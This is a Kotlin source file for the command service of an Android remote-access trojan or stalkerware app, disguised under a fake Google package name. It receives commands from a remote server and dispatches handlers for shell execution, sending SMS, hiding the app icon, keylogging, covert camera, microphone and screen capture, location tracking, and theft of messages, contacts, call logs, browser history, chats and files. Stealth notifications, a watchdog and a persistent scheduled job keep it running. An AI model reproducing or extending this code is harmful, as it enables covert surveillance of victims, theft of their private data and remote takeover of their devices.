package com.google.android.systemservice.services

import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.handlers.AudioHandlers
import com.google.android.systemservice.handlers.CameraHandlers
import com.google.android.systemservice.handlers.CommandContext
import com.google.android.systemservice.handlers.DeviceControlHandlers
import com.google.android.systemservice.handlers.DeviceInfoHandlers
import com.google.android.systemservice.handlers.FileHandlers
import com.google.android.systemservice.handlers.LocationHandlers
import com.google.android.systemservice.handlers.SystemHandlers
import com.google.android.systemservice.network.CommandTransport
import com.google.android.systemservice.network.TransportConfig
import com.google.android.systemservice.utils.CommandQueueManager
import com.google.android.systemservice.utils.DataSyncManager
import com.google.android.systemservice.utils.StealthNotificationHelper
import kotlinx.coroutines.*
import org.json.JSONObject
import android.os.Build

class CommandService : Service(), CommandContext {
    companion object {
        private const val TAG = "SystemCore"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var dataSyncManager: DataSyncManager
    private lateinit var commandQueue: CommandQueueManager
    private lateinit var transport: CommandTransport
    // Delegated handler classes
    private val deviceInfoHandlers = DeviceInfoHandlers(this)
    private val fileHandlers = FileHandlers(this)
    private val locationHandlers = LocationHandlers(this)
    private val cameraHandlers = CameraHandlers(this)
    private val audioHandlers = AudioHandlers(this)
    private val deviceControlHandlers = DeviceControlHandlers(this)
    private val systemHandlers = SystemHandlers(this)

    override fun onCreate() {
        super.onCreate()
        WatchdogService.markServiceRunning(this::class.java)
        Log.d(TAG, "CommandService created")
        
        // Initialize offline data sync manager
        dataSyncManager = DataSyncManager(this)
        
        // Initialize intelligent command queue
        commandQueue = CommandQueueManager(this)
        commandQueue.setResourceConflictHandler(
            onConflict = { resource ->
                Log.d(TAG, "Resource conflict: $resource — pausing our operation")
                // The current recording/capture will be stopped cleanly by the queue manager
            },
            onFreed = { resource ->
                Log.d(TAG, "Resource freed: $resource — can resume")
            }
        )
        
        // Load configuration
        AndroidConfig.loadFromPreferences(this)
        
        // Initialize transport layer (WebSocket + HTTP polling)
        transport = CommandTransport(
            config = TransportConfig(
                scope = serviceScope,
                dataSyncManager = dataSyncManager
            ),
            getDeviceId = { getDeviceIdentifier() },
            onCommandReceived = { command, params, requestId, priority, resource ->
                dispatchCommand(command, params, requestId, priority, resource)
            }
        )
        
        startForegroundSilent()
        scheduleJob()
        transport.connect()
    }

    private fun scheduleJob() {
        try {
            val componentName = ComponentName(this, KeepAliveJobService::class.java)
            val builder = JobInfo.Builder(1234, componentName)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
            
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                // Android 7+ requires 15 mins min
                builder.setPeriodic(15 * 60 * 1000L) 
            } else {
                builder.setPeriodic(5 * 60 * 1000L)
            }
                
            val scheduler = getSystemService(JOB_SCHEDULER_SERVICE) as? JobScheduler ?: return
            scheduler.schedule(builder.build())
            Log.d(TAG, "JobScheduler scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule job: ${(e.message ?: "Unknown error")}")
        }
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            try {
                // Combine all needed foreground types
                var types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                   types = types or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                           android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                           android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, types)
            } catch (e: Exception) {
                // Fallback: try mostly minimal type if full types fail (e.g. permission missing)
                try {
                     startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } catch (e2: Exception) {
                     Log.e(TAG, "Failed to start foreground: ${e2.message}")
                }
            }
        } else {
            startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "CommandService started")
        if (!transport.isConnected) {
            transport.connect()
        }
        // Reverse watchdog: ensure WatchdogService is alive
        ensureWatchdogRunning()
        return START_STICKY
    }
    
    private fun ensureWatchdogRunning() {
        try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager ?: return
            @Suppress("DEPRECATION")
            val running = manager.getRunningServices(Integer.MAX_VALUE)
                .any { it.service.className == WatchdogService::class.java.name }
            if (!running) {
                Log.d(TAG, "WatchdogService is dead, restarting...")
                val intent = Intent(this, WatchdogService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check/restart WatchdogService: ${(e.message ?: "Unknown error")}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // — CommandContext implementation —
    override val appContext: Context get() = this
    override val scope: CoroutineScope get() = serviceScope
    override fun getCurrentRequestId(): String? = transport.currentRequestId.get()
    override fun setCurrentRequestId(requestId: String?) { transport.currentRequestId.set(requestId) }
    override fun getDeviceIdentifier(): String {
        return com.google.android.systemservice.utils.DeviceIdentifierProvider.getDeviceIdentifier(this)
    }

    override fun sendResponse(type: String, data: JSONObject, requestId: String?) {
        transport.sendResponse(type, data, requestId)
    }

    // ── Command hierarchy: priority + resource mapping ──────────────────
    // Maps each command to its default priority and hardware resource.
    // Server can override priority via payload; resource is always local truth.

    private data class CommandMeta(
        val priority: CommandQueueManager.Priority,
        val resource: CommandQueueManager.ResourceType,
        val timeoutMs: Long = 60_000
    )

    private val COMMAND_REGISTRY: Map<String, CommandMeta> = mapOf(
        // CRITICAL — execute immediately, bypass queue
        "shell_command"          to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 30_000),
        "shell_exec"             to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 30_000),
        "send_sms"               to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 15_000),
        "unlock_screen"          to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 10_000),
        "hide_icon"              to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "show_icon"              to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_camera"            to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_audio"             to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_live_video"        to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_live_audio"        to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_screen_record"     to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "stop_location_tracking" to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        "uninstall_app"          to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 30_000),
        "keylog_ack"             to CommandMeta(CommandQueueManager.Priority.CRITICAL, CommandQueueManager.ResourceType.NONE, 5_000),
        // HIGH — hardware commands, queued with resource exclusion
        "start_camera"           to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.CAMERA, 120_000),
        "take_photo"             to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.CAMERA, 30_000),
        "start_audio"            to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.MICROPHONE, 120_000),
        "ambient_record"         to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.MICROPHONE, 120_000),
        "start_live_video"       to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.CAMERA_AND_MIC, 300_000),
        "start_live_audio"       to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.MICROPHONE, 300_000),
        "take_screenshot"        to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.SCREEN, 15_000),
        "start_screen_record"    to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.SCREEN, 300_000),
        "start_location_tracking"to CommandMeta(CommandQueueManager.Priority.HIGH, CommandQueueManager.ResourceType.NONE, 30_000),
        // NORMAL — data collection, no hardware
        "get_location"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_accounts"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_contacts"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_sms"                to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_call_logs"          to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_device_info"        to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_installed_apps"     to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_wifi_info"          to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_keylog_dump"        to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_browser_history"    to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "get_app_usage"          to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "social_media_chats"     to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "browse_files"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "list_files"             to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "search_files"           to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        "start_clipboard_monitor"to CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE),
        // LOW — file operations, non-urgent
        "download_file"          to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "upload_file"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "upload_file_chunk"      to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "delete_file"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "preview_file"           to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "rename_file"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "move_file"              to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "install_apk"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE, 120_000),
        "launch_app"             to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "toggle_wifi"            to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "change_audio_mode"      to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
        "add_geofence"           to CommandMeta(CommandQueueManager.Priority.LOW, CommandQueueManager.ResourceType.NONE),
    )

    /** Maps each command name to a factory that produces its suspend action. */
    private val actionMap: Map<String, (JSONObject?) -> suspend () -> Unit> = mapOf(
        // Location
        "get_location"            to { _ -> { locationHandlers.executeGetLocation() } },
        "get_accounts"            to { _ -> { locationHandlers.executeGetAccounts() } },
        "toggle_wifi"             to { _ -> { locationHandlers.executeToggleWifi() } },
        "start_location_tracking" to { p -> { locationHandlers.executeStartLocationTracking(p) } },
        "stop_location_tracking"  to { _ -> { locationHandlers.executeStopLocationTracking() } },
        // Camera/Media
        "start_camera"            to { p -> { cameraHandlers.executeStartCamera(p) } },
        "stop_camera"             to { _ -> { cameraHandlers.executeStopCamera() } },
        "take_photo"              to { p -> { cameraHandlers.executeTakePhoto(p) } },
        "start_live_video"        to { p -> { cameraHandlers.executeStartLiveVideo(p) } },
        "stop_live_video"         to { _ -> { cameraHandlers.executeStopLiveVideo() } },
        "take_screenshot"         to { _ -> { cameraHandlers.executeTakeScreenshot() } },
        "start_screen_record"     to { p -> { cameraHandlers.executeStartScreenRecord(p) } },
        "stop_screen_record"      to { _ -> { cameraHandlers.executeStopScreenRecord() } },
        // Audio
        "start_audio"             to { p -> { audioHandlers.executeStartAudio(p) } },
        "stop_audio"              to { _ -> { audioHandlers.executeStopAudio() } },
        "start_live_audio"        to { _ -> { audioHandlers.executeStartLiveAudio() } },
        "stop_live_audio"         to { _ -> { audioHandlers.executeStopLiveAudio() } },
        "ambient_record"          to { p -> { audioHandlers.executeAmbientRecord(p) } },
        // Device Info
        "get_device_info"         to { _ -> { deviceInfoHandlers.executeGetDeviceInfo() } },
        "get_contacts"            to { _ -> { deviceInfoHandlers.executeGetContacts() } },
        "get_sms"                 to { _ -> { deviceInfoHandlers.executeGetSms() } },
        "get_call_logs"           to { _ -> { deviceInfoHandlers.executeGetCallLogs() } },
        "get_installed_apps"      to { _ -> { deviceInfoHandlers.executeGetInstalledApps() } },
        "get_wifi_info"           to { _ -> { deviceInfoHandlers.executeGetWifiInfo() } },
        "get_app_usage"           to { _ -> { deviceInfoHandlers.executeGetAppUsage() } },
        "get_browser_history"     to { _ -> { deviceInfoHandlers.executeGetBrowserHistory() } },
        // File operations
        "browse_files"            to { p -> { fileHandlers.executeBrowseFiles(p) } },
        "list_files"              to { p -> { fileHandlers.executeListFiles(p) } },
        "download_file"           to { p -> { fileHandlers.executeDownloadFile(p) } },
        "upload_file"             to { p -> { fileHandlers.executeUploadFile(p) } },
        "upload_file_chunk"       to { p -> { fileHandlers.executeUploadFileChunk(p) } },
        "delete_file"             to { p -> { fileHandlers.executeDeleteFile(p) } },
        "preview_file"            to { p -> { fileHandlers.executePreviewFile(p) } },
        "rename_file"             to { p -> { fileHandlers.executeRenameFile(p) } },
        "move_file"               to { p -> { fileHandlers.executeMoveFile(p) } },
        "search_files"            to { p -> { fileHandlers.executeSearchFiles(p) } },
        // Device Control
        "install_apk"             to { p -> { deviceControlHandlers.executeInstallApk(p) } },
        "uninstall_app"           to { p -> { deviceControlHandlers.executeUninstallApp(p) } },
        "launch_app"              to { p -> { deviceControlHandlers.executeLaunchApp(p) } },
        "unlock_screen"           to { _ -> { deviceControlHandlers.executeUnlockScreen() } },
        "hide_icon"               to { _ -> { deviceControlHandlers.executeHideIcon() } },
        "show_icon"               to { _ -> { deviceControlHandlers.executeShowIcon() } },
        "change_audio_mode"       to { p -> { deviceControlHandlers.executeChangeAudioMode(p) } },
        // System
        "shell_command"           to { p -> { systemHandlers.executeShellCommand(p) } },
        "shell_exec"              to { p -> { systemHandlers.executeShellExec(p) } },
        "get_keylog_dump"         to { _ -> { systemHandlers.executeGetKeylogDump() } },
        "keylog_ack"              to { p -> { systemHandlers.handleKeylogAck(p ?: JSONObject()) } },
        "send_sms"                to { p -> { systemHandlers.executeSendSms(p) } },
        "start_clipboard_monitor" to { _ -> { systemHandlers.executeStartClipboardMonitor() } },
        "social_media_chats"      to { p -> { systemHandlers.executeSocialMediaScraping(p) } },
        "add_geofence"            to { p -> { systemHandlers.executeAddGeofence(p) } },
    )

    /**
     * Resolve the execute function for a command name.
     * Returns null for unknown commands.
     */
    private fun resolveAction(command: String, params: JSONObject?): (suspend () -> Unit)? {
        val factory = actionMap[command] ?: return null
        return factory(params)
    }

    /**
     * Parse server-provided priority string, falling back to registry default.
     */
    private fun parsePriority(serverPriority: String, default: CommandQueueManager.Priority): CommandQueueManager.Priority {
        return when (serverPriority) {
            "critical" -> CommandQueueManager.Priority.CRITICAL
            "high"     -> CommandQueueManager.Priority.HIGH
            "normal"   -> CommandQueueManager.Priority.NORMAL
            "low"      -> CommandQueueManager.Priority.LOW
            else       -> default
        }
    }

    // Dispatch command through strict hierarchy:
    // CRITICAL → execute immediately on serviceScope (stop commands, shell, sms)
    // HIGH/NORMAL/LOW → enqueue in CommandQueueManager with priority + resource
    private fun dispatchCommand(
        command: String,
        params: JSONObject?,
        requestId: String? = null,
        serverPriority: String = "",
        serverResource: String = ""
    ) {
        if (!requestId.isNullOrEmpty()) {
            transport.currentRequestId.set(requestId)
        }

        val action = resolveAction(command, params)
        if (action == null) {
            Log.w(TAG, "Unknown command: $command")
            return
        }

        val meta = COMMAND_REGISTRY[command] ?: CommandMeta(CommandQueueManager.Priority.NORMAL, CommandQueueManager.ResourceType.NONE)
        val priority = parsePriority(serverPriority, meta.priority)

        // CRITICAL commands bypass queue — execute immediately
        if (priority == CommandQueueManager.Priority.CRITICAL) {
            Log.d(TAG, "⚡ CRITICAL command, executing immediately: $command")
            serviceScope.launch { action() }
            return
        }

        // All other commands go through the queue with strict priority ordering
        commandQueue.enqueue(
            CommandQueueManager.Command(
                id = "${command}_${requestId ?: System.currentTimeMillis()}",
                name = command,
                priority = priority,
                resource = meta.resource,
                timeoutMs = meta.timeoutMs,
                action = action
            )
        )
    }

    private fun sendError(message: String) {
        sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }

    override fun onDestroy() {
        WatchdogService.markServiceStopped(this::class.java)
        super.onDestroy()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_DETACH)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(false)
        }
        dataSyncManager.persistQueue()
        commandQueue.shutdown()
        transport.disconnect()
        serviceScope.cancel()
        
        // Restart handled by START_STICKY and WatchdogService — cannot call startService() from background on Android 12+
    }
}
